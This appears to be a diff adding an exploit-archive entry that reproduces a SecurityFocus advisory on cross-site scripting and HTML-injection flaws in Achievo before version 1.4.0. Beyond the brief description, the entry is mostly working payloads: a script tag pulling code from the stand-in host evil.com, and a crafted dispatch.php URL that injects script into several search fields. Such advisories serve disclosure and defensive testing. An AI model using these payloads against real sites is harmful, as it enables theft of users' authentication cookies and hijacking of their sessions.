@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/36661/info
+
+Achievo is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+Versions prior to Achievo 1.4.0 are affected. 
+
+<SCRIPT SRC=//evil.com/xss.js></SCRIPT>
+
+
+http://www.example.com/dispatch.php?atkprevlevel=0&atkescape=&atknodetype=organization.contracts&atkaction=admin&atksmartsearch=clear&atkstartat=0&atksearch[contractnumber]="><script>alert(&#039;xss&#039;);</script>&atksearchmode[contractnumber]=substring&atksearch[contractname]="><script>alert(&#039;xss&#039;);</script>&atksearchmode[contractname]=substring&atksearch_AE_contracttype[contracttype][=&atksearchmode[contracttype]=exact&atksearch_AE_customer[customer]="><script>alert(&#039;xss&#039;);</script>&atksearchmode[customer]=substring
